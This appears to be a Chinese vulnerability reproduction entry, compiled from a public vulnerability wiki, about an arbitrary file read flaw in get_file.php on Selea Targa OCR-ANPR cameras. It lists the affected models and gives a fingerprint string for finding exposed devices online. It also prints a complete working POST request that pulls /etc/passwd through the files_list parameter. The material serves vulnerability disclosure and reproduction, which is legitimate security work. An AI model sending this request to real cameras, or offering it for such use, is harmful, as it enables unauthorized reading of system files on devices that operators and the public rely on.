---
title: "Selea OCR-ANPR摄像机 get_file.php 任意文件读取漏洞"
date: 2026-10-18 09:15:13
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Selea"
tags:
  - "Selea"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

Selea OCR-ANPR摄像机 get_file.php存在 任意文件读取漏洞，通过构造特殊请求获取服务器文件

## 漏洞影响

```
Selea Selea Targa IP OCR-ANPR Camera iZero
Selea Selea Targa IP OCR-ANPR Camera Targa 512
Selea Selea Targa IP OCR-ANPR Camera Targa 504
Selea Selea Targa IP OCR-ANPR Camera Targa Semplice
Selea Selea Targa IP OCR-ANPR Camera Targa 704 TKM
Selea Selea Targa IP OCR-ANPR Camera Targa 805
Selea Selea Targa IP OCR-ANPR Camera Targa 710 INOX
Selea Selea Targa IP OCR-ANPR Camera Targa 750
Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB
```

## 网络测绘

```
"selea_httpd"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202140933858.png)

发送如下请求包

```plain
POST /cgi-bin/get_file.php HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: lang=en; PHPSESSID=bvib0lq6lahlhbjnfv91k13ou0

name=test&files_list=/etc/passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202140933222.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Selea-OCR-ANPR%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
